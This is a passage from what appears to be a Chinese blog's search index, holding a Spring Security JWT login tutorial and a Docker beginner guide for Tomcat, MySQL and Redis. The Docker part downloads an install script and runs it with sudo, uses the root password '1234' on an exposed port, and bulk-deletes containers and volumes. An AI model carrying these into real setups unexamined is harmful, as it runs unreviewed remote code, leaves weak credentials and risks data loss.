synchronized (JwtTokenUtils.class) { if (KEY == null) {// 双重锁 byte[] apiKeySecretBytes = DatatypeConverter.parseBase64Binary(secret); KEY = new SecretKeySpec(apiKeySecretBytes, SignatureAlgorithm.HS256.getJcaName()); } } } return KEY; } } 然后定义 JwtAuthTokenFilter，用于过滤请求\n@Component public class JwtAuthTokenFilter extends OncePerRequestFilter { @Autowired private UserDetailsService userDetailsService; @Autowired private JwtTokenUtils jwtTokenUtils; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { // 从请求头中获取 Authorization 的值，即 token String jwtToken = request.getHeader(jwtTokenUtils.getHeader()); if (!ObjectUtils.isEmpty(jwtToken)) { // 从 token 中获取用户名，用户名存储在负载中，负载一般没有加密，所以负载的内容是可以见，不能在其中存放敏感信息 // 可以通过 https://jwt.io/ 进行解码 String username = jwtTokenUtils.getUsernameFromToken(jwtToken); if (username != null \u0026amp;\u0026amp; SecurityContextHolder.getContext().getAuthentication() == null) { // 通过 userDetailsService 从数据库中获取对应用户的信息 UserDetails userDetails = userDetailsService.loadUserByUsername(username); // 这里校验 token 有效性 if (jwtTokenUtils.validateToken(jwtToken, userDetails)) { // 将 UserDetails 对象 封装为 UsernamePasswordAuthenticationToken 对象 // 第一参数是 Object principal，传入的是 UserDetails 对象，在后面的 Service 中会取出 principal UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities()); // 交给SpringSecurity管理，在之后的过滤器不会被拦截进行二次授权了 SecurityContextHolder.getContext().setAuthentication(authenticationToken); } } } // 将请求转发给过滤器链上的下一个对象 chain.doFilter(request, response); } } 编写 JwtAuthService，处理登录的相关逻辑，使用 AuthenticationManager 对传入的账号密码进行认证，成功返回 生成的 token\n@Service public class JwtAuthService { @Autowired private JwtTokenUtils jwtTokenUtils; @Autowired private AuthenticationManager authenticationManager; public String login(String username, String password) { Authentication authentication = null; try { authentication = authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(username, password)); } catch (Exception e) { throw new RuntimeException(\u0026#34;用户名或密码有误\u0026#34;); } // 这里就是获取的就是在前面 JwtAuthTokenFilter 中传入的 principal User loginUser = (User) authentication.getPrincipal(); return jwtTokenUtils.generateToken(loginUser); } } 用于登录的 Controller\n@RestController public class JwtLoginController { @Autowired private JwtAuthService jwtAuthService; @PostMapping({\u0026#34;/login\u0026#34;, \u0026#34;/\u0026#34;}) public RestResult login(String username, String password) { RestResult result = RestResult.success(); String token = jwtAuthService.login(username, password); result.put(\u0026#34;token\u0026#34;, token); return result; } } 在 SecurityConfig 中 注入并配置 Handler\n// 省略其他代码... @Autowired private JwtAuthTokenFilter jwtAuthTokenFilter; // 重写 AuthenticationManager，避免报错 @Override @Bean public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } @Override protected void configure(HttpSecurity http) throws Exception { // http.formLogin() // .loginPage(\u0026#34;/login.html\u0026#34;) // .loginProcessingUrl(\u0026#34;/login\u0026#34;) // // .defaultSuccessUrl(\u0026#34;/index\u0026#34;) // // .defaultSuccessUrl(\u0026#34;/index\u0026#34;) // .successHandler(successHandler) // .failureHandler(failureHandler) http.sessionManagement() // 不创建和使用 session .sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() .antMatchers(\u0026#34;/login\u0026#34;) .anonymous() .antMatchers(HttpMethod.GET, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;) .permitAll() // 省略其他代码... // 使用 JWT 过滤器 http.addFilterBefore(jwtAuthTokenFilter, UsernamePasswordAuthenticationFilter.class); } // 省略其他代码... 可以通过 Postman 先指定参数（注意是用 POST），获取 token： http://localhost:8081/login?username=user\u0026amp;password=1234\n在 Headers 中添加 Authorization，值为获取到的 token 使用 GET 访问：http://localhost:8081/order 因为 user 没有管理权限，所以访问管理页面会 403：http://localhost:8081/system/role\n具体代码参考 这里\n","permalink":"https://aaronlinv.github.io/posts/springboot-%E6%95%B4%E5%90%88-springsecurity-%E6%A2%B3%E7%90%86/","summary":"\u003ch2 id=\"文档\"\u003e文档\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://docs.spring.io/spring-security/site/docs/current/reference/html5/\"\u003eSpring Security Reference\u003c/a\u003e\n\u003ca href=\"https://www.cnblogs.com/pjjlt/p/10960690.html\"\u003eSpringBoot+SpringSecurity+jwt整合及初体验\u003c/a\u003e\n\u003ca href=\"https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html\"\u003eJSON Web Token 入门教程 - 阮一峰\u003c/a\u003e\n\u003ca href=\"https://jwt.io/\"\u003eJWT 官网\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"springsecurity\"\u003eSpringSecurity\u003c/h2\u003e\n\u003cp\u003e项目 GitHub 仓库地址：\u003ca href=\"https://github.com/aaronlinv/springsecurity-jwt-demo\"\u003ehttps://github.com/aaronlinv/springsecurity-jwt-demo\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"依赖\"\u003e依赖\u003c/h3\u003e\n\u003cp\u003e主要用到了: SpringSecurity,Thymeleaf,Web,Lombok\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework.boot\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-boot-starter-security\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework.boot\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-boot-starter-thymeleaf\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework.boot\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-boot-starter-web\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.projectlombok\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003elombok\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"页面\"\u003e页面\u003c/h3\u003e\n\u003cp\u003e编写页面和 Controller 进行测试，具体页面可以看 \u003ca href=\"https://github.com/aaronlinv/springsecurity-jwt-demo/commit/a3653a02ab9e074d0e25387cf387b2b338353d8d\"\u003e代码\u003c/a\u003e\n主要包含了首页(index)，订单(order)，还有 user,role,menu这三个位于 \u003ccode\u003e/system\u003c/code\u003e 下，需要 admin 权限\u003c/p\u003e\n\u003ch3 id=\"使用内存用户进行表单登录\"\u003e使用内存用户进行表单登录\u003c/h3\u003e\n\u003cp\u003e在 \u003ccode\u003estatic\u003c/code\u003e 下新建 \u003ccode\u003elogin.html\u003c/code\u003e，用于登录\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003eform\u003c/span\u003e \u003cspan class=\"na\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;/login\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;post\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003elabel\u003c/span\u003e \u003cspan class=\"na\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e账户\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003elabel\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebr\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003elabel\u003c/span\u003e \u003cspan class=\"na\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e密码\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003elabel\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebr\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;submit\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;登录\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编写继承 WebSecurityConfigurerAdapter 的 Security 配置类，并开启 @EnableWebSecurity 注解，这个注解包含了 @Configuration\nWebSecurityConfigurerAdapter 中有两个方法，它们名称相同，但是入参不同\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003econfigure\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eHttpSecurity\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ehttp\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eException\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003econfigure\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eAuthenticationManagerBuilder\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eauth\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eException\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e入参为 HttpSecurity 的 configure 可以配置拦截相关的参数\n另一个入参为 AuthenticationManagerBuilder，则是用来配置验证相关的参数\u003c/p\u003e","title":"SpringBoot 整合 SpringSecurity 梳理"},{"content":"下一节：Dockerfile 实践及梳理\n文档 Docker Reference Documentation\nDocker 从入门到实践 【中文】\n安装 安装 Docker，设置开机启动，然后配置阿里云镜像加速\n1. 安装 Docker Docker 官方安装\nCentOS 官方安装教程，直接安装速度相对慢，推荐使用 使用脚本自动安装 Docker：\ncurl -fsSL get.docker.com -o get-docker.sh sudo sh get-docker.sh --mirror Aliyun # 开机启动 docker sudo systemctl enable docker # 启动 docker sudo systemctl start docker 2. 阿里云镜像加速 注意！registry-mirrors 需要替换成自己的 阿里云镜像加速器地址，通过点击地址获取\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;这里替换成自己的阿里云镜像加速器地址\u0026#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker Docker CLI CLI 是 Command-Line Interface （命令行界面）的缩写 命令详情可以参考官方文档：Docker Reference Documentation\n这里通过几个场景，把 Docker 先用起来\n场景0：Tomcat # 输入 docker 回车，docker 的命令会被罗列出来，便于查询 docker # 查询有那些 MySQL 镜像 docker search tomcat 相对于直接search，使用搜索 Docker Hub 更方便\n搜索 Tomcat\n可以看到相关的镜像介绍、使用帮助、历史版本：Tomcat\n可以按照文档中的 \u0026ldquo;How to use this image\u0026rdquo; 的提示来运行镜像\n# 拉取 tomcat 镜像 docker pull tomcat:8.0-jre8 # 查看镜像列表，可以看到 tomcat 镜像，该命令等特于：docker image ls docker images # 运行tomcat 镜像 docker run tomcat:8.0-jre8 # 前台运行，会输出 tomcat 日志 # 按 Ctrl + C 停止 # 添加 -d 后台运行参数 docker run -d tomcat:8.0-jre8 # 查看容器列表，可以查看到容器的id、镜像(IMAGE)、状态(STATUS)、网络端口(PROT)、容器名称(NAME)等信息 docker ps # 查看 tomcat 日志，这里的 `clever_swanson` 为容器id或名称 docker logs clever_swanson # 查看容器内部进程信息 docker top clever_swanson # 进入容器 # i 和 t 参数可以让我们以伪终端的方式进入容器 # bash 是所使用 shell docker exec -it clever_swanson bash # 在容器内可以使用 Linux 命令 # 退出容器，回到宿主机（宿主机就是安装 Docker 的这台机器） exit # 不需要容器了，可以停止容器 docker stop clever_swanson # 查看容器列表，tomcat 就隐藏了 docker ps # -a 参数查看全部所有容器的列表（包括停止的 tomcat） docker ps -a # 启动已经停止的容器 docker start clever_swanson # 删除容器，如果容器还在运行需要加 -f 参数 docker rm clever_swanson docker rm -f clever_swanson # 删除了容器，就可以把镜像也删除了，如果有容器还是该镜像需要加 -f 参数 docker rmi tomcat:8.0-jre8 docker rmi -f tomcat:8.0-jre8 场景1：Tomcat 只是将 Tomcat 容器 run 起来，还是无法满足使用 还需要将容器网络端口映射到宿主机才可以使得外部可以访问容器内部服务 为了方便还需要把 Tomcat 的数据目录和配置目录挂载到宿主机，方便直接进行编辑\n可参考官方文档：Tomcat\n# 部署 Tomcat # run 容器时，本地不存在对应镜像，会自动 pull # -p 将容器内的网络端口映射到宿主机 ，8080:8080 前面为宿主机，后面为容器 # --name 指定容器名称 docker run -p 8080:8080 -d --name mytomcat tomcat:8.0-jre8 # 可以通过 docker 的子命令对 容器进行操作，比如：ps,exec,top,stop # 这个容器已经占用了宿主机的 8080 端口，为了后续的 Tomcat 可以绑定到宿主机的 8080 端口，所以将 这个容器 stop docker stop mytomcat # 通过数据卷的方式 将容器内的数据映射到宿主机 # 语法：- v 数据卷名称:容器内目录 # Tomcat 部署的 web应用目录：/usr/local/tomcat/webapps # 配置文件：/usr/local/tomcat/conf docker run -p 8080:8080 -v apps:/usr/local/tomcat/webapps -v confs:/usr/local/tomcat/conf -d --name mytomcat2 tomcat:8.0-jre8 这个时候 Tomcat 已经启动了，可以通过 http://ip宿主机:8080 来访问 Tomcat 的默认主页，例如我的访问地址 http://192.168.43.166:8080 ，看到汤姆猫的图标就成功了。如果访问失败，可能是对应的 8080 端口没有开放，CentOS7 可以参考：CentOS7开启端口\n场景2：MySQL 可参考官方文档：MySQL\n# 通过 -e 指定参数，指定 MySQL 的 root 账户的密码为：1234 docker run --name mysql -e MYSQL_ROOT_PASSWORD=1234 -p 3306:3306 -d mysql:5.7.32 # 停止容器，防止端口占用 docker stop mysql # 数据库的数据将会随着容器消失而消失，所以需要将数据库文件持久化到宿主机， # 配置映射到本地 docker run --name mysql2 -e MYSQL_ROOT_PASSWORD=1234 -p 3306:3306 -d -v mysqldata:/var/lib/mysql -v mysqlconfig:/etc/mysql mysql:5.7.32 MySQL 就成功运行了，可以通过 Navicat 或者其他工具测试数据库，地址为宿主机 ip地址，用户名为 root，密码为：1234，可以尝试存储数据，数据会被存储在数据卷，这里指定的数据卷名称为：mysqldata\n# 查看所有数据卷 docker volume ls # 查看 MySQL 的数据卷 docker inspect mysqldata # 返回的 json 对象，其中 Mountpoint 的值就是，文件对应挂载的位置 # 我这里挂载的地址为：/var/lib/docker/volumes/mysqldata/_data # 进入这个目录，就可以看到存储的文件 使用数据卷的好处在于：容器被移除了，重新运行一个新容器，直接挂载原来的数据卷就可了，数据不会丢失\n# 移除容器 docker rm -f mysql2 # 重新运行新的容器，并挂载原来的数据卷 docker run --name mysql2 -e MYSQL_ROOT_PASSWORD=1234 -p 3306:3306 -d -v mysqldata:/var/lib/mysql -v mysqlconfig:/etc/mysql mysql:5.7.32 Redis 可参考官方文档：Redis\n需要注意的是：Redis 需要在镜像名称即 redis:5.0.10 的后面添加 redis-server --appendonly yes ，以此覆盖镜像默认的命令\ndocker run --name redis -p 6379:6379 -d redis:5.0.10 # 停止容器，防止端口占用 docker stop redis # 开启持久化 redis-server --appendonly yes # 开启后，持久化生成的 aop 文件会被放入容器中的 /data 目录中 docker run --name redis2 -p 6379:6379 -d -v redisdata:/data redis:5.0.10 redis-server --appendonly yes # 可以使用 Redis Desktop Manager 等工具，通过宿主机 ip 连接，进行测试 清理容器 # 查看容器列表可以看到很多容器 docker ps # -a 可以看到所有的容器，包括已经停止的 docker ps -a # 如果忘记了参数或者命令可以在命令后面加上 --help，会有提示 docker ps --help # 可以看到：-q, --quiet Only display container IDs，即：-q参数仅输出容器id，结合 -a，可以输出所有容器的 id docker ps -aq # 结合 rm -f 就可以移除所有的容器了 docker rm -f $(docker ps -aq) # 清除没有用到的数据卷，有重要数据要谨慎 docker volume prune docker 我们可以通过下面的命令，来找到 docker 的位置\nwhereis docker # 我这里执行返回的结果是：docker: /usr/bin/docker /etc/docker /usr/libexec/docker /usr/share/man/man1/docker.1.gz 可以看到 docker 的可执行文件位于 /usr/bin，这个路径存在环境变量 PATH 中，所以我们可以在任意路径 使用 docker 命令\nDocker 是 C/S 架构模式（客户端-服务器），所以上面的 docker 实际上是 Docker 的客户端，Docker 的服务器是 Docker Deamon 对应的就是 dockerd，也在这个目录下，Deamon 就是 Docker 引擎，Docker 客户端通过 Docker API 与 Deamon 进行通信\ndocker 是一个可执行程序，包含了许多命令，输入\ndocker --help 会将 Usage（用法）、Option（选项）、Commands（命令）都展示出来，Management Commands 也s是 Commands。每个命令可能会有它自己的子命令、选项\n# run 命令有许多的选项 docker run --help # volume 命令有许多子命令，例如：ls, rm, inspect docker volume --help 命令梳理 使用 --help 参数，就可以查询到到对应命令的使用方法，所以我们只要理解 Docker 命令的框架即可，不用记忆命令细节 对镜像进行操作：images, rmi, search 对容器进行操作：run, stop, start, restart, exec, logs, top 其他：ps, cp, info, pull, version\n还有一些 Management Commands，例如：image, network, volume 这些命令都是名词，即要操作的对象，而具体的操作通过其子命令指定，语义更加清晰 image 常用子命令：ls, rm, prune network 常用子命令：create, ls, inspect, rm, prune volume 常用子命令：同上面 network 的四个\n参考资料 Install docker using the convenience script 【编程不良人】Docker容器技术\u0026amp;Docker-Compose实战 Docker组件 Docker 组件之间的关系\n下一节：Dockerfile 实践及梳理\n","permalink":"https://aaronlinv.github.io/posts/docker-%E5%AE%9E%E8%B7%B5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%A2%B3%E7%90%86/","summary":"\u003cp\u003e下一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15213211.html\"\u003eDockerfile 实践及梳理\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"文档\"\u003e文档\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/reference/\"\u003eDocker Reference Documentation\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://vuepress.mirror.docker-practice.com/\"\u003eDocker 从入门到实践 【中文】\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"安装\"\u003e安装\u003c/h2\u003e\n\u003cp\u003e安装 Docker，设置开机启动，然后配置阿里云镜像加速\u003c/p\u003e\n\u003ch3 id=\"1-安装-docker\"\u003e1. 安装 Docker\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/get-docker/\"\u003eDocker 官方安装\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/engine/install/centos/\"\u003eCentOS 官方安装教程\u003c/a\u003e，直接安装速度相对慢，推荐使用 \u003ca href=\"https://vuepress.mirror.docker-practice.com/install/centos/#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85\"\u003e使用脚本自动安装 Docker\u003c/a\u003e：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -fsSL get.docker.com -o get-docker.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo sh get-docker.sh --mirror Aliyun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 开机启动 docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启动 docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl start docker\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-阿里云镜像加速\"\u003e2. 阿里云镜像加速\u003c/h3\u003e\n\u003cp\u003e注意！\u003ccode\u003eregistry-mirrors\u003c/code\u003e 需要替换成自己的 \u003ca href=\"https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\"\u003e阿里云镜像加速器地址\u003c/a\u003e，通过点击地址获取\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mkdir -p /etc/docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo tee /etc/docker/daemon.json 